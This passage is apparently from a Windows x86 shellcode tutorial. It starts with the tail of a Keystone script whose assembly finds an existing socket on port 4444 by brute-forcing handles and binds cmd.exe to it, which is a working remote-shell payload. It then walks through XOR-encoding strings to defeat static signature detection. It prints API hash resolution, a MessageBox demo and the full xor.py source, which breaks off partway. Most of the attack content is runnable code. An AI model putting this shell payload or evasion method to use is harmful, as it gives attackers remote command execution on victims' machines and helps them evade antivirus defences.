    "   mov   ebx, eax                  ;"
    "   push  0x3bfcedcb                ;"  #   WSAStartup
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x1C], eax           ;"
    "   push  0xadf509d9                ;"  #   WSASocketA
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x20], eax           ;"
    "   push  0x95066ef2                ;"  #   getpeername
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x24], eax           ;"

    " struct_sockaddr_in:                "
    "   xor   eax, eax                  ;"
    "   mov   al, 0x10                  ;"
    "   sub   esp, eax                  ;"
    "   mov   [ebp+0x28], esp           ;"
    "   xor   eax, eax                  ;"
    "   mov   [ebp+0x2C], eax           ;"
    "   mov   dword ptr [ebp+0x2C], 0x50;"  #   start at handle 0x50
    "   jmp   call_getpeername          ;"

    " loop_handle:                       "
    "   add   dword ptr [ebp+0x2C], 0x04;"  #   next handle
    "   cmp   dword ptr [ebp+0x2C], 0x400;" #   past max?
    "   jl    call_getpeername          ;"
    "   jmp   call_ExitProcess          ;"  #   no socket found

    " call_getpeername:                  "
    "   xor   eax, eax                  ;"
    "   mov   al, 0x10                  ;"
    "   push  eax                       ;"
    "   mov   eax, esp                  ;"
    "   push  eax                       ;"  #   &namelen
    "   push  dword ptr [ebp+0x28]      ;"  #   &sockaddr_in
    "   push  dword ptr [ebp+0x2C]      ;"  #   handle
    "   call  dword ptr [ebp+0x24]      ;"  #   getpeername
    "   pop   ecx                       ;"  #   clean namelen
    "   xor   edx, edx                  ;"
    "   cmp   edx, eax                  ;"  #   success?
    "   jnz   loop_handle              ;"
    "   xor   eax, eax                  ;"
    "   mov   ax, 0x5C11                ;"  #   port 4444
    "   mov   edi, [ebp+0x28]           ;"
    "   cmp   word ptr [edi+0x02], ax   ;"  #   port match?
    "   jnz   loop_handle              ;"

    " zero_structs:                      "
    "   xor   eax, eax                  ;"
    "   xor   ecx, ecx                  ;"
    "   mov   cl, 0x44                  ;"
    "   sub   esp, ecx                  ;"
    "   mov   edi, esp                  ;"
    "   push  ecx                       ;"
    "   rep   stosb                     ;"
    "   pop   ecx                       ;"
    "   sub   edi, ecx                  ;"

    " struct_STARTUPINFOA:               "
    "   xor   edx, edx                  ;"
    "   mov   dx, 0x0101                ;"
    "   dec   edx                       ;"  #   0x0100
    "   xor   eax, eax                  ;"
    "   mov   eax, [ebp+0x2C]           ;"  #   found socket handle
    "   mov   [edi+0x40], eax           ;"  #   hStdError
    "   mov   [edi+0x3C], eax           ;"  #   hStdOutput
    "   mov   [edi+0x38], eax           ;"  #   hStdInput
    "   mov   [edi+0x2C], edx           ;"  #   dwFlags
    "   mov   dword ptr [edi], ecx      ;"  #   cb = 0x44
    "   xor   esi, esi                  ;"
    "   xchg  esi, edi                  ;"

    " zero_structs_pi:                   "
    "   xor   eax, eax                  ;"
    "   xor   ecx, ecx                  ;"
    "   mov   cl, 0x10                  ;"
    "   sub   esp, ecx                  ;"
    "   mov   edi, esp                  ;"
    "   push  ecx                       ;"
    "   rep   stosb                     ;"
    "   pop   ecx                       ;"
    "   sub   edi, ecx                  ;"

    " call_CreateProcessA:               "
    "   xor   edx, edx                  ;"
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"
    "   xor   eax, eax                  ;"
    "   mov   ax, 0x6578                ;"  #   "xe"
    "   shl   eax, 0x08                 ;"
    "   mov   al, 0x65                  ;"  #   "exe\0"
    "   push  eax                       ;"
    "   push  0x2e646d63                ;"  #   "cmd."
    "   mov   edx, esp                  ;"
    "   xor   eax, eax                  ;"
    "   push  edi                       ;"  #   lpProcessInformation
    "   push  esi                       ;"  #   lpStartupInfo
    "   push  eax                       ;"
    "   push  eax                       ;"
    "   push  eax                       ;"
    "   inc   eax                       ;"
    "   push  eax                       ;"  #   bInheritHandles = TRUE
    "   dec   eax                       ;"
    "   push  eax                       ;"
    "   push  eax                       ;"
    "   push  edx                       ;"  #   "cmd.exe"
    "   push  eax                       ;"
    "   call  dword ptr [ebp+0x14]      ;"  #   CreateProcessA

    " call_ExitProcess:                  "
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"
    "   call  dword ptr [ebp+0x18]      ;"  #   ExitProcess(0)
)

ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)

shellcode = bytes(encoding)
shellcode_str = ''.join(f'\\x{b:02x}' for b in shellcode)
print(f"[+] Generated Shellcode: {shellcode_str}")
print(f"[+] Shellcode length: {len(shellcode)} bytes")
```


---

## 14. XOR Encoding: Runtime Decoding

Encoding shellcode at runtime defeats static signature detection. The simplest and most effective technique is **XOR encoding** -- each byte of sensitive data is XORed with a key before embedding, then decoded in memory just before use.

This shellcode demonstrates the concept by XOR-encoding the string `"remo"` with key `0xAA`, then decoding it at runtime and displaying it in a MessageBox.

### Step 1: Resolving kernel32.dll Functions

Two functions from `kernel32.dll`:

**TerminateProcess** Hash: `0x78b5b983`. Clean process exit after the message box.

**LoadLibraryA** Hash: `0xec0e4e8e`. Loads user32.dll for the MessageBox API.

```nasm
resolve_symbols_kernel32:
    push  0x78b5b983              ; TerminateProcess hash
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x10], eax

    push  0xec0e4e8e              ; LoadLibraryA hash
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x14], eax
```

<div align="center"><svg viewBox="0 0 750 90" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1403" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1403"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1403" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="90" rx="10" fill="url(#bg_s1403)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1403)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="14" filter="url(#glow_s1403)" font-weight="bold">kernel32.dll API Resolution</text>
  <rect x="125" y="48" width="250" height="30" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="250" y="68" text-anchor="middle" fill="#ff3366" font-size="11">TerminateProcess → [ebp+0x10]</text>
  <rect x="400" y="48" width="230" height="30" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="515" y="68" text-anchor="middle" fill="#00d4ff" font-size="11">LoadLibraryA → [ebp+0x14]</text>
</svg></div>

*Figure 14.a -- Two kernel32 APIs: TerminateProcess for cleanup, LoadLibraryA to load user32.dll.*

### Step 2: Loading user32.dll

Unlike the network shellcodes that load `ws2_32.dll`, this one loads `user32.dll` to access the GUI MessageBox API:

```nasm
load_user32:
    xor   eax, eax
    mov   ax, 0x6c6c              ; "ll"
    push  eax                     ; "ll\0\0"
    push  0x642e3233              ; "32.d"
    push  0x72657375              ; "user"
    mov   esi, esp                ; ESI = "user32.dll"
    push  esi
    call  dword ptr [ebp+0x14]   ; LoadLibraryA("user32.dll")
```

<div align="center"><svg viewBox="0 0 750 100" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1404" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1404"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1404" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1404" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="100" rx="10" fill="url(#bg_s1404)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1404)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="14" filter="url(#glow_s1404)" font-weight="bold">Loading user32.dll</text>
  <rect x="70" y="48" width="130" height="35" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="135" y="70" text-anchor="middle" fill="#ff6b35" font-size="10">"user" DWORD</text>
  <line x1="200" y1="65" x2="218" y2="65" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1404)"/>
  <rect x="223" y="48" width="130" height="35" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="288" y="70" text-anchor="middle" fill="#ff6b35" font-size="10">"32.d" DWORD</text>
  <line x1="353" y1="65" x2="371" y2="65" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1404)"/>
  <rect x="376" y="48" width="130" height="35" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="441" y="70" text-anchor="middle" fill="#ff6b35" font-size="10">"ll\0\0" (ax)</text>
  <line x1="506" y1="65" x2="524" y2="65" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1404)"/>
  <rect x="529" y="48" width="180" height="35" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="619" y="70" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">LoadLibraryA</text>
</svg></div>

*Figure 14.b -- user32.dll string constructed from three stack pushes, then loaded via LoadLibraryA.*

### Step 3: Resolving MessageBoxA

**MessageBoxA** `int MessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)` Displays a modal dialog box with text and buttons. Hash: `0xbc4da2a8`.

```nasm
resolve_symbols_User32:
    mov   ebx, eax                ; EBX = user32.dll base
    push  0xbc4da2a8              ; MessageBoxA hash
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x18], eax         ; save MessageBoxA
```

<div align="center"><svg viewBox="0 0 750 90" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1405" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1405"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1405" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="90" rx="10" fill="url(#bg_s1405)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1405)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="14" filter="url(#glow_s1405)" font-weight="bold">user32.dll API Resolution</text>
  <rect x="150" y="48" width="200" height="30" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="250" y="68" text-anchor="middle" fill="#00d4ff" font-size="10">EBX = user32.dll base</text>
  <rect x="400" y="48" width="230" height="30" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="515" y="68" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">MessageBoxA → [ebp+0x18]</text>
</svg></div>

*Figure 14.c -- MessageBoxA resolved from user32.dll's export table via ROR-13 hash 0xbc4da2a8.*

### Step 4: The XOR Decode Loop

This is the core technique. The string `"remo"` is stored XOR-encoded on the stack, then decoded byte-by-byte:

**Encoding math:**

| Char | ASCII | XOR 0xAA | Encoded |
|------|-------|----------|---------|
| `r`  | 0x72  | 0x72 ^ 0xAA | 0xD8 |
| `e`  | 0x65  | 0x65 ^ 0xAA | 0xCF |
| `m`  | 0x6D  | 0x6D ^ 0xAA | 0xC7 |
| `o`  | 0x6F  | 0x6F ^ 0xAA | 0xC5 |

Pushed as a DWORD in little-endian: `0xC5C7CFD8`

```nasm
decode_remo:
    xor   eax, eax
    push  eax                     ; null terminator
    push  0xC5C7CFD8              ; encoded "remo" (XOR 0xAA)
    mov   esi, esp                ; ESI = pointer to encoded bytes
    xor   ecx, ecx
    mov   cl, 0x04                ; 4 bytes to decode

decode_loop:
    xor   byte ptr [esi], 0xAA   ; XOR current byte with key
    inc   esi                     ; advance to next byte
    loop  decode_loop             ; decrement ECX, loop if not zero
    mov   esi, esp                ; reset ESI to start of decoded string
```

<div align="center"><svg viewBox="0 0 750 320" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1401" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1401"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1401" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1401" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="320" rx="10" fill="url(#bg_s1401)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1401)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1401)" font-weight="bold">XOR Decode Loop Key 0xAA</text>

  <!-- Iteration 1 -->
  <text x="50" y="60" fill="#00d4ff" font-size="11" font-weight="bold">Iteration 1 (ECX=4):</text>
  <rect x="50" y="68" width="55" height="30" rx="4" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="77" y="88" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">0xD8</text>
  <text x="118" y="88" fill="#8b949e" font-size="14">^</text>
  <rect x="135" y="68" width="55" height="30" rx="4" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="162" y="88" text-anchor="middle" fill="#ff6b35" font-size="12" font-weight="bold">0xAA</text>
  <text x="203" y="88" fill="#8b949e" font-size="14">=</text>
  <rect x="220" y="68" width="55" height="30" rx="4" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="247" y="88" text-anchor="middle" fill="#00ff88" font-size="12" font-weight="bold">0x72</text>
  <text x="290" y="88" fill="#e0e7ff" font-size="12">→ 'r'</text>

  <!-- Iteration 2 -->
  <text x="50" y="120" fill="#00d4ff" font-size="11" font-weight="bold">Iteration 2 (ECX=3):</text>
  <rect x="50" y="128" width="55" height="30" rx="4" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="77" y="148" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">0xCF</text>
  <text x="118" y="148" fill="#8b949e" font-size="14">^</text>
  <rect x="135" y="128" width="55" height="30" rx="4" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="162" y="148" text-anchor="middle" fill="#ff6b35" font-size="12" font-weight="bold">0xAA</text>
  <text x="203" y="148" fill="#8b949e" font-size="14">=</text>
  <rect x="220" y="128" width="55" height="30" rx="4" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="247" y="148" text-anchor="middle" fill="#00ff88" font-size="12" font-weight="bold">0x65</text>
  <text x="290" y="148" fill="#e0e7ff" font-size="12">→ 'e'</text>

  <!-- Iteration 3 -->
  <text x="50" y="180" fill="#00d4ff" font-size="11" font-weight="bold">Iteration 3 (ECX=2):</text>
  <rect x="50" y="188" width="55" height="30" rx="4" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="77" y="208" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">0xC7</text>
  <text x="118" y="208" fill="#8b949e" font-size="14">^</text>
  <rect x="135" y="188" width="55" height="30" rx="4" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="162" y="208" text-anchor="middle" fill="#ff6b35" font-size="12" font-weight="bold">0xAA</text>
  <text x="203" y="208" fill="#8b949e" font-size="14">=</text>
  <rect x="220" y="188" width="55" height="30" rx="4" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="247" y="208" text-anchor="middle" fill="#00ff88" font-size="12" font-weight="bold">0x6D</text>
  <text x="290" y="208" fill="#e0e7ff" font-size="12">→ 'm'</text>

  <!-- Iteration 4 -->
  <text x="50" y="240" fill="#00d4ff" font-size="11" font-weight="bold">Iteration 4 (ECX=1):</text>
  <rect x="50" y="248" width="55" height="30" rx="4" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="77" y="268" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">0xC5</text>
  <text x="118" y="268" fill="#8b949e" font-size="14">^</text>
  <rect x="135" y="248" width="55" height="30" rx="4" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="162" y="268" text-anchor="middle" fill="#ff6b35" font-size="12" font-weight="bold">0xAA</text>
  <text x="203" y="268" fill="#8b949e" font-size="14">=</text>
  <rect x="220" y="248" width="55" height="30" rx="4" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="247" y="268" text-anchor="middle" fill="#00ff88" font-size="12" font-weight="bold">0x6F</text>
  <text x="290" y="268" fill="#e0e7ff" font-size="12">→ 'o'</text>

  <!-- Result -->
  <rect x="380" y="68" width="340" height="212" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="550" y="95" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">Stack Memory</text>
  <text x="410" y="120" fill="#8b949e" font-size="11">Before:</text>
  <text x="500" y="120" fill="#ff3366" font-size="13" font-weight="bold">D8 CF C7 C5 00 00 00 00</text>
  <text x="410" y="160" fill="#8b949e" font-size="11">After:</text>
  <text x="500" y="160" fill="#00ff88" font-size="13" font-weight="bold">72 65 6D 6F 00 00 00 00</text>
  <text x="500" y="185" fill="#e0e7ff" font-size="12">" r  e  m  o  \0"</text>
  <rect x="400" y="200" width="300" height="60" rx="4" fill="#0d1117" stroke="#ff6b35" stroke-width="1"/>
  <text x="550" y="222" text-anchor="middle" fill="#ff6b35" font-size="11" font-weight="bold">XOR is its own inverse:</text>
  <text x="550" y="242" text-anchor="middle" fill="#e0e7ff" font-size="11">data ^ key = encoded → encoded ^ key = data</text>

  <text x="375" y="310" text-anchor="middle" fill="#8b949e" font-size="10">The LOOP instruction decrements ECX and jumps while ECX != 0</text>
</svg></div>

*Figure 14.1 -- XOR decode loop. Each encoded byte is XORed with key 0xAA to recover the original ASCII character. The `loop` instruction handles both the counter decrement and the conditional jump.*

### Step 5: Calling MessageBoxA

With the decoded string on the stack, we call `MessageBoxA` to display it:

```nasm
    xor   ebx, ebx               ; EBX = 0
    push  ebx                     ; uType = MB_OK (0)
    push  esi                     ; lpCaption = "remo"
    push  esi                     ; lpText = "remo"
    push  ebx                     ; hWnd = NULL
    call  dword ptr [ebp+0x18]   ; MessageBoxA(NULL, "remo", "remo", MB_OK)
```

<div align="center"><svg viewBox="0 0 750 110" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1406" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1406"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1406" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="110" rx="10" fill="url(#bg_s1406)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1406)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="14" filter="url(#glow_s1406)" font-weight="bold">MessageBoxA Display Decoded String</text>
  <rect x="50" y="48" width="130" height="30" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
  <text x="115" y="68" text-anchor="middle" fill="#8b949e" font-size="10">hWnd = NULL</text>
  <rect x="195" y="48" width="150" height="30" rx="4" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="270" y="68" text-anchor="middle" fill="#00ff88" font-size="10">lpText = "remo"</text>
  <rect x="360" y="48" width="170" height="30" rx="4" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="445" y="68" text-anchor="middle" fill="#00ff88" font-size="10">lpCaption = "remo"</text>
  <rect x="545" y="48" width="160" height="30" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
  <text x="625" y="68" text-anchor="middle" fill="#8b949e" font-size="10">uType = MB_OK (0)</text>
  <rect x="50" y="85" width="655" height="18" rx="3" fill="#0d1117" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="377" y="99" text-anchor="middle" fill="#8b949e" font-size="9">ESI points to decoded "remo" used for both title and body text</text>
</svg></div>

*Figure 14.d -- MessageBoxA called with the XOR-decoded "remo" string as both caption and text.*

> `MessageBoxA(NULL, "remo", "remo", MB_OK)` displays a popup with "remo" as both the title and the message body.

### Step 6: TerminateProcess

After the user dismisses the message box, the shellcode calls `TerminateProcess(-1, 0)` to exit cleanly. The handle value `-1` is `GetCurrentProcess()` -- a pseudo-handle referring to the current process:

```nasm
call_terminateprocess:
    xor   eax, eax
    push  eax                     ; uExitCode = 0
    dec   eax                     ; EAX = 0xFFFFFFFF = -1
    push  eax                     ; hProcess = -1 (current process)
    call  dword ptr [ebp+0x10]   ; TerminateProcess(-1, 0)
```

<div align="center"><svg viewBox="0 0 750 90" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1407" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1407"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1407" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="90" rx="10" fill="url(#bg_s1407)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1407)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="14" filter="url(#glow_s1407)" font-weight="bold">TerminateProcess Clean Exit</text>
  <rect x="150" y="48" width="450" height="30" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="375" y="68" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">TerminateProcess(-1, 0) dec eax builds -1 from 0</text>
</svg></div>

*Figure 14.e -- TerminateProcess exits using -1 (pseudo-handle for current process).*

### Complete XOR Encoding Flow

<div align="center"><svg viewBox="0 0 750 180" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1402" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1402"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1402" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1402" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="180" rx="10" fill="url(#bg_s1402)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1402)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1402)" font-weight="bold">XOR Encoding Shellcode Pipeline</text>

  <rect x="15" y="50" width="105" height="45" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="67" y="68" text-anchor="middle" fill="#00d4ff" font-size="9" font-weight="bold">Resolve APIs</text>
  <text x="67" y="82" text-anchor="middle" fill="#e0e7ff" font-size="8">k32 + user32</text>
  <line x1="120" y1="72" x2="138" y2="72" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1402)"/>

  <rect x="143" y="50" width="105" height="45" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="195" y="68" text-anchor="middle" fill="#ff3366" font-size="9" font-weight="bold">Push encoded</text>
  <text x="195" y="82" text-anchor="middle" fill="#e0e7ff" font-size="8">0xC5C7CFD8</text>
  <line x1="248" y1="72" x2="266" y2="72" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1402)"/>

  <rect x="271" y="50" width="115" height="45" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="2"/>
  <text x="328" y="68" text-anchor="middle" fill="#ff6b35" font-size="9" font-weight="bold">XOR decode loop</text>
  <text x="328" y="82" text-anchor="middle" fill="#e0e7ff" font-size="8">key=0xAA, 4 bytes</text>
  <line x1="386" y1="72" x2="404" y2="72" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1402)"/>

  <rect x="409" y="50" width="105" height="45" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="461" y="68" text-anchor="middle" fill="#00ff88" font-size="9" font-weight="bold">MessageBoxA</text>
  <text x="461" y="82" text-anchor="middle" fill="#e0e7ff" font-size="8">"remo" decoded</text>
  <line x1="514" y1="72" x2="532" y2="72" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1402)"/>

  <rect x="537" y="50" width="105" height="45" rx="5" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="589" y="68" text-anchor="middle" fill="#8b949e" font-size="9" font-weight="bold">Terminate</text>
  <text x="589" y="82" text-anchor="middle" fill="#e0e7ff" font-size="8">clean exit</text>

  <rect x="50" y="115" width="650" height="50" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="375" y="138" text-anchor="middle" fill="#e0e7ff" font-size="12" font-weight="bold">Signature Evasion</text>
  <text x="375" y="155" text-anchor="middle" fill="#8b949e" font-size="10">The string "remo" never appears in the shellcode bytes. Static scanners see only 0xC5C7CFD8.</text>
</svg></div>

*Figure 14.2 -- XOR encoding pipeline. Sensitive strings are embedded in encoded form and decoded at runtime, defeating static byte-pattern signature matching.*

### Full Shellcode Source (`xor.py`)

```python
import ctypes, struct
from keystone import *

CODE = (
    " start:                             "
    "   mov   ebp, esp                  ;"
    "   add   esp, 0xfffff9f0           ;"  #   Avoid NULL bytes

    " find_kernel32:                     "
    "   xor   ecx, ecx                  ;"  #   ECX = 0
    "   mov   esi,fs:[ecx+0x30]         ;"  #   ESI = &(PEB) ([FS:0x30])
    "   mov   esi,[esi+0x0C]            ;"  #   ESI = PEB->Ldr
    "   mov   esi,[esi+0x1C]            ;"  #   ESI = PEB->Ldr.InInitOrder

    " next_module:                       "
    "   mov   ebx, [esi+0x08]           ;"  #   EBX = InInitOrder[X].base_address
    "   mov   edi, [esi+0x20]           ;"  #   EDI = InInitOrder[X].module_name
    "   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next)
    "   cmp   [edi+12*2], cx            ;"  #   modulename[12] == 0x00?
    "   jne   next_module               ;"

    " find_function_shorten:             "
    "   jmp find_function_shorten_bnc   ;"

    " find_function_ret:                 "
    "   pop esi                         ;"
    "   mov   [ebp+0x04], esi           ;"
    "   jmp resolve_symbols_kernel32    ;"

    " find_function_shorten_bnc:         "
    "   call find_function_ret          ;"

    " find_function:                     "
    "   pushad                          ;"
    "   mov   eax, [ebx+0x3c]           ;"
    "   mov   edi, [ebx+eax+0x78]       ;"
    "   add   edi, ebx                  ;"
    "   mov   ecx, [edi+0x18]           ;"
    "   mov   eax, [edi+0x20]           ;"
    "   add   eax, ebx                  ;"
    "   mov   [ebp-4], eax              ;"

    " find_function_loop:                "
    "   jecxz find_function_finished    ;"
    "   dec   ecx                       ;"
    "   mov   eax, [ebp-4]              ;"
    "   mov   esi, [eax+ecx*4]          ;"
    "   add   esi, ebx                  ;"

    " compute_hash:                      "
    "   xor   eax, eax                  ;"
